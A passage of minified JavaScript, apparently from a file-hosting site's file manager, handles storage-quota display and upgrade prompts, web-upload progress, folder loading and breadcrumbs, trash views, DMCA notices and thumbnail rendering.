MYF_WIDGET_STORAGE_calculateUsedStoragePercent(e){MYF_WIDGET_STORAGE_usedStorage=Math.max(parseInt(e,10),0),aXm=!1,aWx=!1,aXJ=!1,!MYF_STORAGE_bAdFreeDownloadPremiumUser&&MYF_WIDGET_STORAGE_usedStorage>=MYF_WIDGET_STORAGE_totalStorage?aXm=!0:!MYF_STORAGE_bAdFreeDownloadPremiumUser&&MYF_WIDGET_STORAGE_totalStorage-MYF_WIDGET_STORAGE_usedStorage<=aXE&&(aWx=!0),aXm?aWh=fileSizeToString(MYF_WIDGET_STORAGE_usedStorage-MYF_WIDGET_STORAGE_totalStorage):aWh="",iUnroundedPercent=100*Math.min(parseFloat(MYF_WIDGET_STORAGE_usedStorage/MYF_WIDGET_STORAGE_totalStorage),1),MYF_WIDGET_STORAGE_usedStoragePercent=iUnroundedPercent>0&&iUnroundedPercent<1?1:Math.round(iUnroundedPercent)}function MYF_WIDGET_STORAGE_updateStorageDisplay(){MYF_WIDGET_STORAGE_totalStorage?($("span#storage_used",top.document).text(fileSizeToString(MYF_WIDGET_STORAGE_usedStorage,1,!0)),$("span#storage_total",top.document).text(fileSizeToString(MYF_WIDGET_STORAGE_totalStorage,0,!0)),$("span#storage_not-applicable",top.document).hide(),$("span#storage_applicable",top.document).show()):($("span#storage_applicable",top.document).hide(),$("span#storage_not-applicable",top.document).show()),$(".smBarColor",top.document).animate({width:MYF_WIDGET_STORAGE_usedStoragePercent+"%"},"slow",(function(){if(aXq&&(aXm||aWx)){if($(".smSpaceIndicator",top.document).addClass("smUpgradePromo").find(".smUpgradeSpace").unbind("click").click((function(){return window.location="/upgrade",!1})),aWx&&1!=e){var e=aL("storageupsellshown");aWg(null,!0),aY("storageupsellshown",1,1)}else aXm&&("undefined"==typeof aXB||!aXB||aXB&&aXB!=aWh)&&(window.aXB=aWh,aWg(null,!1))}else"undefined"!=typeof aWo&&(aWo=null),$(".smSpaceIndicator",top.document).removeClass("smUpgradePromo")})),aXa()}function MYF_WIDGET_STORAGE_fSetClickEvent(){aXq&&$(".smSpaceIndicator",top.document).unbind("click").click((function(){return window.open("/upgrade/"),!1}))}function aWg(e,t,a){if(t&&aWx&&1==aL("storageupsellshown"))return!1;return LoadIframeLightbox("/templates/upgrade/storage_upsell.php",720,600,!1,!1,!0,!0),$("#modal_msg_iframe").load((function(){aXF(e,a)})),!1}function aXF(e,t){try{var a=$("#modal_msg_iframe").contents();a.find(".storageUpsell").removeClass("accountStorageGood accountStorageExceeded unknownExceededLimitActive uploadExceeded"),t?a.find(".storageUpsell").addClass("unknownExceededLimitActive"):!0===e||!0===aXm?(a.find(".storageUpsell").addClass("accountStorageExceeded"),a.find(".storageOverage").text(aWh)):aWx||a.find(".storageUpsell").addClass("accountStorageGood"),a.find(".storageUsed").text(fileSizeToString(MYF_WIDGET_STORAGE_usedStorage,2)),a.find(".storageLimit, .fullStorage").text(fileSizeToString(MYF_WIDGET_STORAGE_totalStorage)),a.find(".halfStorage").text(fileSizeToString(MYF_WIDGET_STORAGE_totalStorage/2)),a.find(".upgradeAmount").text("$"+aXd+" more")}catch(e){}}function Wj(e,t){var a="Transfer complete"==e.status;Us=e.uploadkey,$("#container").addClass("webUploadHeight"),$("#webUploadIndicator").show(),$("#webUploadStatus").text(e.status),$(".webUploadIndicator .smBarColorWebUpload").css("width",e.percentage+"%");var o=$("#modal_msg_iframe");if(o.length>0)try{if($oWebUploadIframeContents=o.contents(),$oWebUploadIframeContents.find("#white_info_box").hide(),$oWebUploadIframeContents.find(".webu-error").text(""),$oWebUploadIframeContents.find("#processing_message").hide(),$oWebUploadIframeContents.find("#loadingmessage").hide(),$oWebUploadIframeContents.find("#typeupload").hide(),$oWebUploadIframeContents.find("#uploading_div_hideshow").show(),$oWebUploadIframeContents.find(".webu-filename").text(e.filename),$oWebUploadIframeContents.find(".webu-filesize").text(formatBytes(parseInt(e.size,10))),$oWebUploadIframeContents.find(".webu-eta").text("Transfer completed"==e.eta?"Completed":e.eta),$oWebUploadIframeContents.find(".webu-url").val(e.url),$oWebUploadIframeContents.find(".webu-cancelcurrent").attr("href","/dynamic/deletewebupload.php?key="+Us),$oWebUploadIframeContents.find(".webu-percent").text(e.percentage),$oWebUploadIframeContents.find(".webuploadprogressbar").css("width",e.percentage+"%"),"39"==e.error_status){var n=$oWebUploadIframeContents.find(".webu-filestatus");"Storage Limit Exceeded"!=n.text()&&Zi(1,"Error: the file at this url would exceed your storage limit."),n.text("Storage Limit Exceeded"),$oWebUploadIframeContents.find("#white_info_box").hide()}else{var r="There was an unknown error with the download.",i={0:"",10:"The file you tried to download to your account was too large.",11:"The file you tried to download to your account was too small.",15:"The remote server returned an HTTP error.",16:"The file could not be added to your account.",17:"The image you specified was too large to be stored on our service.",19:"There was a virus detected in the file we downloaded.",20:"The archive you requested is invalid and cannot be added to the site.",21:"The archive you requested is either password protected or has a CRC error.",22:"There was an unknown error downloading the archive.",27:"The requested filename is already in your account.",35:"Access was denied to the resource specified in the URL.",36:"The server specified is returning data too slowly.",37:"The file is taking too long to download.",38:"The download was interrupted."};""===e.error_status&&(e.error_status="0"),void 0!==i[e.error_status]&&(r=i[e.error_status]),$oWebUploadIframeContents.find("#white_info_box").toggle(""!=r),$oWebUploadIframeContents.find(".webu-filestatus").text(""!=r?"Failed":e.status),$oWebUploadIframeContents.find(".webu-error").text(r)}$(".webu-filesize").parent().show(),$oWebUploadIframeContents.find("#webupload_progress").toggle(!a),$oWebUploadIframeContents.find(".webu-clearcompleted").toggleClass("disabled",t>=10),$oWebUploadIframeContents.find(".webu-cancelcurrent").toggle(!a)}catch(e){}a&&Gv(!1)}function Ur(e){var t=function(e,t){var a=parseInt(e.status_code,10),o=parseInt(t.status_code,10);return a<o?-1:a>o?1:0};(new window.tH.Dv).Vu({all_web_uploads:"yes"},{success:function(e){if(e.response.web_uploads&&e.response.web_uploads.length>0){e.response.web_uploads.sort(t);var a=e.response.web_uploads[0];if(a){for(var o=0,n=0;n<e.response.web_uploads.length;n++)"yes"==e.response.web_uploads[n].active&&o++;Wj(a,o)}}else Gv(!0)},error:function(){Gv(!0)}})}var xC=null,Us="";function WC(e){xC&&clearInterval(xC),$("#webUploadStatus").text("Waiting to start"),Ur(),xC=setInterval(Ur,1e4);var t=$("#modal_msg_iframe");if(t.length>0)try{$oWebUploadIframeContents=t.contents(),e?$oWebUploadIframeContents.find("#processing_message").show():$oWebUploadIframeContents.find("#webupload_container").show()}catch(e){}}function Gv(e){e||FI(null,null,null,!0),Us="",$("#webUploadIndicator").hide(),$("#container").removeClass("webUploadHeight"),xC&&clearInterval(xC),xC=null;var t=$("#modal_msg_iframe");if(t.length>0)try{$oWebUploadIframeContents=t.contents(),$oWebUploadIframeContents.find("#processing_message").hide(),$oWebUploadIframeContents.find("#loadingmessage").hide(),$oWebUploadIframeContents.find("#typeupload").toggle(e),$oWebUploadIframeContents.find("#uploading_div_hideshow").toggle(!e)}catch(e){}}function ahl(e){"yes"!=e.shared&&"child"!=e.shared||($.each(e.folders||{},(function(e,t){t.shared="child",ahl(t)})),$.each(e.files||{},(function(e,t){t.shared="child"})))}function ahd(){$.each(tH.folders.memory||{},(function(e,t){ahl(t)}))}function YV(e,t){var a=ajC.aiu(),o=a+parseInt(e.file_count||0),n=1;$.each(e.files||{},(function(t,o){var r=new tH.Cp(o,e);tH.files.Yx(o.quickkey,r),a++,200==++n&&(ajC.aje(a),n=1),o.parent=e,$("#mfload_progress_bar").width(100*a/parseInt(e.file_count)+"%")})),t?ajC.aje(a+1):ajC.aje(o+1),tH.folders.Yx(e.folderkey,e)}function atP(){if(window.localStorage){localStorage.clear(),tH.files.atY(),tH.files.atG(),tH.folders.atY(),tH.folders.atG(),$.each(tH.folders.memory,(function(e,t){localStorage["folder-"+e]=tH.yJ.WF(t)})),localStorage.user=MYF_sUserEnc;new auV(ajm(tH.files.memory),(function(e){for(var t=0;t<1200;t++)e.length&&(b=e.shift(),localStorage["file-"+b]=tH.Cp.WF(tH.files.memory[b]))}),400,100,!0).atR()}}var Pg={},Ph="";function avn(e){if(e&&0!=e.length){e[0]&&e[0].parent&&e[0].parent.folderkey&&e[0].parent.folderkey!=Ph&&(Ph=e[0].parent.folderkey,Pg={}),tH.aca&&0!=tH.aca.length||(Pg={});var t=e[0].quickkey?"files_"+e[0].parent_chunk:"folders_"+e[0].parent_chunk;tH.aca&&0!=tH.aca.length&&void 0!==Pg[t]||(Pg[t]=!0,void 0===tH.aca&&(tH.aca=[]),$.each(e,(function(e,t){t.itemrownum=tH.aca.length,tH.aca.push(t),t.quickkey?tH.files.Yx(t.quickkey,t):tH.folders.Yx(t.folderkey,t);var a=t.quickkey?t.quickkey:t.folderkey;if(1==tH.aSk&&"yes"!=t.shared&&"child"!=t.shared&&mainList.ZF(a),tH.aQX&&"yes"!=t.shared&&"child"!=t.shared){var o=tH.aQX;"folder"==o&&t.folderkey&&mainList.ZF(t.folderkey),"file"==o&&t.quickkey&&mainList.ZF(t.quickkey),o==t.filetype&&mainList.ZF(t.quickkey)}})),(1==tH.aSk||tH.aQX)&&$.publish("list/selection"))}}var bha=!1,gk=null,ir=null,cN=null;function aHM(e,t,a,o,n,r){if(!r){if(bha)return e.folderkey!=ir&&(cN={folder:e,type:t,sortby:a,order:o,chunk:n}),void(gk||(gk=setTimeout((function(){if(bha=!1,null!=cN){var e=cN;cN=null,aHM(e.folder,e.type,e.sortby,e.order,e.chunk)}gk=null}),3e3)));bha=!0,ir=e.folderkey,tH.aca=[],delete tH.currentFolder.status,MYF_fShowSpinner("content")}var i={data:{content_type:t,filter:filterBy,order_by:a,order_direction:o,chunk:n,version:APIVERSION}},s=aLo();e.folderkey;s.aGU(e,i,{success:function(i,s){if(tH.folders.Yx(i.folderkey,i),avn(s),s.length<aIl&&!r&&("all"==filterBy||"public"==filterBy||"private"==filterBy)&&null==cN)aHM(e,"folders"==t?"files":"folders",a,o,n,!0);else if(MYF_fHideSpinner("content"),$.publish("folder/completed",e),bha=!1,null==cN)aHb(i);else{var l=cN;cN=null,aHM(l.folder,l.type,l.sortby,l.order,l.chunk)}},error:function(t,a,o){if(bha=!1,t){MYF_fHideSpinner("content"),$.publish("folder/completed",e);var n="",r="",i="";"abort"!=a&&t.responseText&&(r=(n=JSON.parse(t.responseText)).response.error.toString(),i=n.response.message.toString()),"114"==r?"no"!=e.shared&&""!=e.shared?Zi(0,"Permission denied.  This folder is no longer shared by its owner."):Zi(0,"You do not have permissions to this folder."):"112"===r?(aek||"myfiles"===e.folderkey||(window.location.hash="#myfiles",$(window).hashchange()),13===window.location.hash.length&&Zi(0,i)):"293"==r?window.top.location="/error.php?errno=378":Zi(0,"There was a problem while attempting to browse the folder. "+i),window.location.hash=tH.currentFolder.folderkey}}},atC)}function aaO(e,t,a){var o=!1;if("trash"==e.folderkey?(sortBy="name",o=!0,bfi(),Xb.bfg()):bff(),o)avn($.values(e.folders).concat($.values(e.files)));else if("multiple_keys"===e.share_type){var n=$.values(e.folders).sort(YT.folder["created"==sortBy?"created":"name"]),r=$.values(e.files).sort(YT.file[sortBy]);$.each(n,(function(e,t){n[e]=tH.folders.yx(t.folderkey)})),tH.aca=n.concat(r)}if(aoP(tH.aca,t),currentFolder=e,tH.currentFolder=currentFolder,abM=currentFolder.folderkey,aek||o||aU("mfcurrentFolder",currentFolder.folderkey,1800),!o&&currentFolder.folderkey&&(tH.currentFolder.parent=tH.folders.memory[currentFolder.folderkey].parent),aek&&$("#fileDetails #folder_name").text(tH.currentFolder.name||"My Files").attr("title",tH.currentFolder.name||"My Files"),!aek&&!o){var i=currentFolder.folderkey;tH.aVJ=setTimeout((function(){i==currentFolder.folderkey&&FI(currentFolder.folderkey)}),1500)}"myfiles"==currentFolder.folderkey||aek&&currentFolder.folderkey==afI?($("#main_files_container").hasClass("thisfolder_root")||$("#main_files_container").addClass("thisfolder_root"),$("#container").hasClass("thisfolder_root")||$("#container").addClass("thisfolder_root")):($("#main_files_container").removeClass("thisfolder_root"),$("#container").removeClass("thisfolder_root")),"on"==aL("thumbview")&&$("#viewtab2").click(),$.publish("folder/render",[e])}function aHb(e){tH.currentFolder=e,YV(e),aaO(e,null,!0),$("title",document.head).text(e.name),$.publish("folder/render",e),bha=!1}function abH(e,t){tH.currentFolder=e;if(1!=sortAscending||"all"!=filterBy&&"public"!=filterBy&&"private"!=filterBy&&"folders"!=filterBy?(aHy=sortAscending?"asc":"desc",aGQ="folders"==filterBy?"folders":"files"):(aHy="asc",aGQ="folders"),"trash"==e.folderkey){var a=new window.tH.aCa(window.aCQ||0),o=-1,n=-1,r=-1;a.beN({data_only:"yes",content_type:"folders"},(function(e){if(e.response&&(o=parseInt(e.response.folder_count,10)||0,-1!=n)){r=o+n,$("#trash_restoreAll, #trash_deleteAll").toggle(r>0),$(".trashCan").text("Trash ("+r+" items)");var t=tH.folders.memory.trash;t?(t.folderkey="trash",t.name="Trash",t.file_count=n,t.folder_count=o,t.total_files=n,t.total_folders=o):t=new tH.yJ({folderkey:"trash",name:"Trash",file_count:n,folder_count:o,total_files:n,total_folders:o}),tH.folders.memory.trash=t,aHM(t,aGQ,sortBy,aHy)}})),a.beN({data_only:"yes",content_type:"files"},(function(e){if(e.response&&(n=parseInt(e.response.file_count,10),-1!=o)){r=o+n,$("#trash_restoreAll, #trash_deleteAll").toggle(r>0),$(".trashCan").text("Trash ("+r+" items)");var t=tH.folders.memory.trash;t?(t.folderkey="trash",t.name="Trash",t.file_count=n,t.folder_count=o,t.total_files=n,t.total_folders=o):t=new tH.yJ({folderkey:"trash",name:"Trash",file_count:n,folder_count:o,total_files:n,total_folders:o}),tH.folders.memory.trash=t,aHM(t,aGQ,sortBy,aHy)}}))}else"multiple_keys"===e.share_type?aaO(e,t):aHM(e,aGQ,sortBy,aHy)}function XO(){var e,t=window.location.hash.slice(1);if(!t){if(aek)return!1;var a=aL("mfcurrentFolder")||"";return e=a||"myfiles",window.location.hash=e,!1}return(e=-1!=t.indexOf("search-")?t.replace("search-",""):t)||"myfiles"}function aFV(){var e=!1,t=XO();if(tH.folders.yx(t)){var a=t;a&&tH.folders.memory[a]&&(tH.folders.memory[a].folders={},tH.folders.memory[a].files={},tH.currentFolder=tH.folders.yx(a),e=!0)}else tH.currentFolder=new tH.yJ(t),e=!0;e&&(abH(tH.currentFolder),$(window).resize())}function alb(){window==window.top||aek||(top.location.hash=window.location.hash),afv()&&aft(!1,!0),aFV(),tH.MYF_oSelected&&mainList.aTN(),aHS=setTimeout((function(){$("#container").addClass("mfloading")}),250),aHJ(0),aHJ(99,1e4),$(window).scrollTop(0),LF.ZR()}function aIS(e,t,a,o,n,r){if(!bha){MYF_fShowSpinner("content");try{var i={data:{content_type:t,filter:filterBy,order_by:a,order_direction:o,chunk:n,version:APIVERSION}};aHa.aGU(e,i,{success:function(t,a){avn(a),tH.folders.Yx(t.folderkey,t),r(a),setTimeout((function(){$.publish("folder/lazy_load_add",t)}),250),MYF_fHideSpinner("content"),$.publish("folder/completed",e)},error:function(){MYF_fHideSpinner("content"),$.publish("folder/completed",e)}},!0)}catch(e){LogDlErrorMyFiles(e,"MYF:aIS()")}}}function aQx(e,t){var a=filterBy,o=sortBy,n=sortAscending?"asc":"desc";if(t||(t=e,e=null),"folders"==e&&"all"!=a&&"public"!=a&&"private"!=a)return!0;if("files"==e&&"folders"==a)return!0;if(!(t&&t.status&&t.status[a]&&t.status[a][o]&&t.status[a][o][n]))return!1;var r=t.status[a][o][n];return 0===tH.currentFolder.file_count&&(r.files={loaded:!0}),e?r[e]&&r[e].loaded:aQx("folders",t)&&aQx("files",t)}function aRB(){return sortAscending?aQx("folders",tH.currentFolder)&&"folders"!=filterBy?"files":"folders":aQx("files",tH.currentFolder)?"folders":"files"}function aJh(){var e=tH.currentFolder,t=aRB(),a=filterBy,o=sortBy,n=sortAscending?"asc":"desc";if(!(e&&e.status&&e.status[a]&&e.status[a][o]&&e.status[a][o][n]))return 1;var r=e.status[a][o][n];return r[t]&&r[t].chunk?r[t].chunk+1:1}function aoP(e,t){if(mainList.aTN(),aFi(),e&&e.length){$empty.hide(),$mainList.empty();var a=window.afv();bfw();if(a&&(window.tH.aca=[],avn(e)),window.tH.ayo(!0),!(aQx("folders",tH.currentFolder)&&aQx("files",tH.currentFolder)||a||"multiple_keys"==tH.currentFolder.share_type)){var o=0,n=!1,r=null;aaa=function(e){if(n)o++;else{n=!0;var t,a=[];t=r?r+=1:r=aJh(),aIS(tH.currentFolder,aRB(),sortBy,sortAscending?"asc":"desc",t,(function(e){$.merge(a,e),e.length<aIl&&!aQx(tH.currentFolder)?(t=r=aJh(),aIS(tH.currentFolder,aRB(),sortBy,sortAscending?"asc":"desc",t,(function(e){$.merge(a,e),i()}))):i()}))}function i(){n=!1,$.publish("folder/lazy_load",[a]);var t=aQx(window.tH.currentFolder);!t&&o>0?(o--,"function"==typeof aaa&&aaa(e)):t&&(aaa=null),!0===e&&0==o&&tH.ayo()}}}axm($mainList)}else aaa=null,$mainList.empty(),$empty.show();aos(tH.currentFolder),aHJ(105)}function axm(e){e.children("li.folder").unbind("draghover").bind("draghover",(function(e){$(this).toggleClass("folder_highlight",e.enter)})).bind("mouseleave mouseout",(function(e){$(this).removeClass("folder_highlight")}))}function aGv(e){!e||aek&&tH.currentFolder.folderkey==afI?tH.currentFolder.folderkey!=tH.root.folderkey?$folderUp.show().find("a").attr("href","#"+tH.root.folderkey).data("key",tH.root.folderkey):$folderUp.hide().data("key","myfiles"):$folderUp.show().find("a").attr("href","#"+e).data("key",e)}function aos(e,t){if($("#myfilesCurrentFolderName").text(e.name),$("#myfilesCurrentFolderName").toggleClass("cameraUploads","Camera"===e.name),aek){var a=(""+window.tH.root.owner_name).replace(" ","");a=a||"Anonymous",$("#owner_breadcrumb1").text('"'+a+'" Shared Files')}if(aKP=function(){if(!aFi()&&!aek){function e(e){if(!aFi()){Xb.acI("myfiles",tH.currentFolder.folderkey);var t=new window.tH.yJ(e);tH.root=t,tH.folders.Yx("myfiles",t),awH();var a={};$.each(window.tH.folders.memory.myfiles.folders,(function(e,t){a[t.folderkey]=t})),tH.folders.memory.myfiles.folders=a,tH.root=t,$.publish("folderbrowser/load",tH.currentFolder),tH.aFA=!0}}if(tH.folders.memory.myfiles&&tH.folders.memory.myfiles.folders&&!$.isEmptyObject(tH.folders.memory.myfiles.folders))e(tH.folders.memory.myfiles);else{var t=tH.folders.yx("myfiles");t||(t=new tH.yJ("myfiles")),aHa.aGU(t,{data:{content_type:"folders",order_by:"name",order_direction:"asc",version:APIVERSION}},e,!0)}}},SHARED||"myfiles"==e.folderkey||"trash"==e.folderkey||"yes"==e.shared||"child"==e.shared){tH.root||(tH.root={folderkey:"myfiles"});var o=null;if("myfiles"!=e.folderkey){o=tH.currentFolder.parent||tH.currentFolder.parent_folderkey?tH.currentFolder.parent?tH.currentFolder.parent.folderkey:tH.currentFolder.parent_folderkey:"myfiles";for(var n=!1,r=[],i=tH.currentFolder;!n;){if(!i||i.parent||i.parent_folderkey||(i=tH.folders.yx(i.folderkey)||i),i&&!i.parent&&i.parent_folderkey&&(i.parent=tH.folders.yx(i.parent_folderkey)),i&&i.folders)for(var s=0;s<i.folders.length;s++)i.folders[s].folderkey&&tH.folders.Yx(i.folders[s].folderkey,new tH.yJ(i.folders[s]));i.parent&&i.parent.name&&i.parent.folderkey&&i.parent.folderkey!=i.folderkey?"myfiles"==i.parent.folderkey?n=!0:(r.push({folderkey:i.parent.folderkey,name:i.parent.name}),i=i.parent):n=!0}$breadcrumbs.find("a.breadcrumb[id!='owner_breadcrumb1']").remove(),r.length>0&&(r.reverse(),$breadcrumbs.append($($.map(r,(function(e){var t=tH.folders.yx(e.folderkey);t?e=t:tH.folders.Yx(e.folderkey,new tH.yJ(e));var a=htmlspecialchars(bcv(e.name,MYF_iBreadCrumbsMaxLength/r.length));return'<a href="#'+e.folderkey+'" class="breadcrumb" data-key="'+e.folderkey+'">'+a+"</a>"})).join(""))).find("a").bind("draghover",(function(e){$(this).toggleClass("folder_highlight",e.enter)})))}aGv(o),aKP()}else t&&aHa.aIX(e.folderkey),aHa.aLA(e,{success:function(t){var a=t.response.folder_depth.chain_folders;if(a.shift(),a.reverse(),$breadcrumbs.find("a.breadcrumb[id!='owner_breadcrumb1']").remove(),a.length){for(var o=0,n=a.length;o<n;o++){if(!r){var r=tH.folders.yx("myfiles");r||(r=new tH.yJ("myfiles"))}var i=tH.folders.yx(a[o].folderkey);(i=new tH.yJ(a[o],r)).parent=r,r=i}tH.folders.memory[e.folderkey].parent=r,tH.currentFolder=tH.folders.yx(e.folderkey);var s="breadcrumb";$breadcrumbs.append($($.map(a,(function(e){(e=tH.folders.yx(e.folderkey)||e)||tH.folders.Yx(new window.tH.yJ(e)),"trash"==e.folderkey&&(s="breadcrumb trashBreadcrumb"),"Camera"===e.name&&(s+=" cameraUploads");var t=htmlspecialchars(bcv(e.name,MYF_iBreadCrumbsMaxLength/a.length));return'<a href="#'+e.folderkey+'" class="'+s+'" data-key="'+e.folderkey+'">'+t+"</a>"})).join(""))).find("a").bind("draghover",(function(e){$(this).toggleClass("folder_highlight",e.enter)})),$("#container").toggleClass("trashMode",$(".trashBreadcrumb").length>0)}aKP(),aGv(window.tH.currentFolder.parent?window.tH.currentFolder.parent.folderkey:window.tH.currentFolder.parent_folderkey)},error:function(e){}})}function aBe(){$("#files-search-wrap").hide()}function aAC(){$("#files-search-wrap").show(),$("#search").focus()}function awQ(e,t){if(e.response&&e.response.result&&"Success"==e.response.result){var a={},o={};$.each(e.response.tickets,(function(e,t){null!=t&&(a[t.quickkey]=!0,o[t.company_name]=t)}));for(var n=!1,r=0;r<t.length;r++)if(a[t[r]]){n=!0;break}var i={};sizeOf(o)>1&&t.length>1?i.company_name="Multiple Agencies":$.each(o,(function(e,t){i=t}));try{n?$("#modal_msg_iframe").contents().find("#dmca-match-message").show():$("#modal_msg_iframe").contents().find("#dmca-similar-message").show(),i.company_name?$("#modal_msg_iframe").contents().find("#dmca-company").html(i.company_name||""):$("#modal_msg_iframe").contents().find("#dmca-company-area").hide(),i.contact_email?$("#modal_msg_iframe").contents().find("#dmca-company-email").html(i.contact_email||""):$("#modal_msg_iframe").contents().find("#dmca-company-email-area").hide(),i.company_address?$("#modal_msg_iframe").contents().find("#dmca-company-addr").html(i.company_address||""):$("#modal_msg_iframe").contents().find("#dmca-company-addr-area").hide()}catch(e){}}else aH(0,"No DMCA info found.")}function Xz(e){return function(t,a){return parseInt(t[e])-parseInt(a[e])}}function akJ(){try{var e={};return $.each(tH.files.memory,(function(t,a){e[a.owner_name]=1})),$.each(tH.folders.memory,(function(t,a){a!=tH.root&&(e[a.owner_name]=1)})),sizeOf(e)}catch(e){LogDlErrorMyFiles(e,"MYF:akJ()")}}function alu(){try{for(key in tH.root.folders)if(tH.root.folders[key].owner_name)return tH.root.folders[key].owner_name;for(key in tH.root.files)return tH.root.files[key].owner_name;return""}catch(e){LogDlErrorMyFiles(e,"MYF:alu()")}}function Fr(e,t){try{if(!atC&&window.localStorage&&!aek){var a=$.extend(!0,{},e),o=[];a.parent=a.parent?a.parent.folderkey:"",$.each(a.folders,(function(e,t){a.folders[e]=$.extend({},t),a.folders[e].parent="",a.folders[e].folders={},a.folders[e].files={}})),$.each(a.files,(function(e,t){a.files[e]=$.extend(!0,{},t),a.files[e].parent=""})),o[t]=JSON.stringify(a),aHa.aGF&&aHa.aGF.postMessage({cmd:"parse-responses",params:o})}}catch(e){LogDlErrorMyFiles(e,"MYF:Fr()")}}function Xo(e){try{if(!atC&&window.localStorage)try{var t=JSON.parse(localStorage[e]);return folderext=new window.tH.yJ(t),$.each(folderext.folders,(function(e,t){folderext.folders[e]=new window.tH.yJ(t)})),folderext}catch(e){return!1}}catch(e){LogDlErrorMyFiles(e,"MYF:Xo()")}}function aBE(e,t){var a,o,n=!1;if($("#myfiles_wrap").hasClass("sizeS")&&(a="s",(n=!!e.thumb1ready)||(n=!(!window.tH.aRp||!window.tH.aRp[e.quickkey])),o="/images/imgerrs/50-1.jpg"),$("#myfiles_wrap").hasClass("sizeM")&&(a="m",(n=!!e.thumb2ready)||(n=!(!window.tH.aRE||!window.tH.aRE[e.quickkey])),o="/images/imgerrs/50-2.jpg"),$("#myfiles_wrap").hasClass("sizeL")&&(a="l",(n=!!e.thumb3ready)||(n=!(!window.tH.aRK||!window.tH.aRK[e.quickkey])),o="/images/imgerrs/50-3.jpg"),!1!==n&&!0!==t||e.parent.folderkey!=window.tH.currentFolder.folderkey){if(e.parent.folderkey==window.tH.currentFolder.folderkey){setTimeout((function(){!function(e){var t=$("li#file-"+e.quickkey),n=t.find(".itemThumbnail img").data("dsrc"+a)||o;t.find(".itemThumbnail").css("background-image","url("+n+")"),t.find(".itemThumbnail").removeClass("processing")}(e)}),150)}}else setTimeout((function(){aCs(e)}),150)}function aaZ(){$mainList.find("li.file .itemThumbnail").css("background-image","none").addClass("processing")}function Vf(e,t){$.publish("folder/render",[e]),$(window).resize()}function aps(){window.tH.aca=[],abH(window.tH.currentFolder)}function aQt(e){return!(!$("#myfiles_wrap").hasClass("sizeS")||1!=e.thumb1ready)||(!(!$("#myfiles_wrap").hasClass("sizeM")||1!=e.thumb2ready)||(!(!$("#myfiles_wrap").hasClass("sizeL")||1!=e.thumb3ready)||!(!$("myfiles_wrap").hasClass("listView")||1!=e.thumb0ready)))}function aQP(e){avg+=e}function bkV(e){var t=(new Date).getTime();bke=(t-(window.tH.bkc||0))/1e3;for(var a=!0,o=0;o<e.length;o++)if(document.getElementById("folder-"+e[o])){a=!1;break}a||(bke>=bkg?window.tH.yJ.asi(e,(function(e){if(e.response){if(e.response.folder_info){var t=tH.folders.yx(e.response.folder_info.folderkey);t&&(t.total_files=e.response.folder_info.total_files,t.total_folders=e.response.folder_info.total_folders,e.response.folder_info.overflow&&(t.overflow=e.response.folder_info.overflow),asN(t,!0))}e.response.folder_infos&&$.each(e.response.folder_infos,(function(e,t){var a=tH.folders.yx(t.folderkey);a.total_files=t.total_files,a.total_folders=t.total_folders,t.overflow&&(a.overflow=t.overflow),asN(a,!0)})),$("#dragIcon").hide()}}),!0):(window.tH.bov&&clearTimeout(window.tH.bov),window.tH.bov=setTimeout((function(){bkV(e)}),1e3*(bkg+.1-bke))))}function aua(e){e&&(aQr=null,avg=0,aog=0,$("#main_list").css({margin:0}),$(window).resize());var t,a="";if(window.tH.currentFolder&&(a=window.tH.currentFolder.folderkey),$.each($("#main_list li"),(function(e,t){var o=$(t),n=o.hasClass("file"),r=o.data("key"),i=window.tH[n?"files":"folders"].memory[r],s="";i&&i.parent&&(s=i.parent.folderkey),void 0!==s&&(a===s||$("#container").hasClass("searchresults")||o.remove())})),window.tH.aca&&(window.tH.aca.length>0||e)){var o=$("#main_list li:first"),n=0==o.length?49:o.outerHeight(),r=$(window).scrollTop(),i=$(window).height(),s=$("#header").outerHeight()+$("#myfiles_controlbar_wrap").outerHeight(),l=Math.ceil((i-s)/n),d=Math.ceil(l/2),c=12,f=2*d+l,u=1;if(tH.aca.length>aog&&(aog=tH.aca.length),UO()){var p=$(window).width()-268-20,h=$("#myfiles_wrap").hasClass("sizeS")?122:$("#myfiles_wrap").hasClass("sizeM")?183:244;u=Math.floor(p/h),n=0==o.length?$("#myfiles_wrap").hasClass("sizeS")?142:$("#myfiles_wrap").hasClass("sizeM")?203:264:o.outerHeight(),l=Math.ceil(i/n),c=3*u,d=Math.ceil(l),f=d*u*2+l*u}function m(e){var t=Math.floor(e/u)*n;$(window).scrollTop(0),$("body").stop().animate({scrollTop:t},500,(function(){$(window).resize()}))}function g(e,t){t||e.reverse();var a="";$.each(e,(function(t,o){(Lu=window.tH.aca[o])&&(a+=Lu.quickkey?"#file-"+Lu.quickkey:"#folder-"+Lu.folderkey,$(Lu.quickkey?"#file-"+Lu.quickkey:"#folder-"+Lu.folderkey).hasClass("row_context")&&contextMenu.isVisible()&&contextMenu.aoh(),e[t+1]&&(a+=", "))}));var o=$(a);if(o.length>0){if(t){var r=Math.floor(v/u)*n;$("#main_list").css({marginTop:r})}else{var i=Math.ceil((aog-w)/u)*n;$("#main_list").css({marginBottom:i})}o.remove()}}function y(e,t){var a=[];if(t){var o=Math.floor(v/u)*n;$("#main_list").css({marginTop:o})}else{var r=Math.ceil((aog-w)/u)*n;$("#main_list").css({marginBottom:r})}t&&e.reverse(),$.each(e,(function(e,o){if(Lu=tH.aca[o]){var n=Lu;if("undefined"==typeof Lu||Lu.relevancy){var r=Lu.quickkey;(r="files")?n=new window.tH.Cp(Lu):(a.push(Lu.folderkey),n=new window.tH.yJ(Lu));var i=n.quickkey,s=!1;if(tH.MYF_oSelected[r]&&i)for(var l=0;l<tH.MYF_oSelected[r].length;l++)if(i==tH.MYF_oSelected[r][l]){s=!0;break}n.selected=s}else{var d=Lu.quickkey?tH.files.yx(Lu.quickkey):tH.folders.yx(Lu.folderkey);d&&(d.itemrownum=Lu.itemrownum,Lu.quickkey?tH.files.Yx(d.quickkey,d):(a.push(Lu.folderkey),tH.folders.Yx(d.folderkey,d)),n=d)}var c=XB([n]);t?$("#main_list").prepend($(c)):$("#main_list").append($(c))}})),a.length>0&&bkV(a)}$(window).resize((function(){if(UO()){var e=$(window).width()-268-20,t=$("#myfiles_wrap").hasClass("sizeS")?122:$("#myfiles_wrap").hasClass("sizeM")?183:244;u=Math.floor(e/t),n=0==o.length?142:o.outerHeight(),l=Math.ceil(i/n),c=3*u,d=Math.ceil(l),f=d*u*2+l*u}}));var 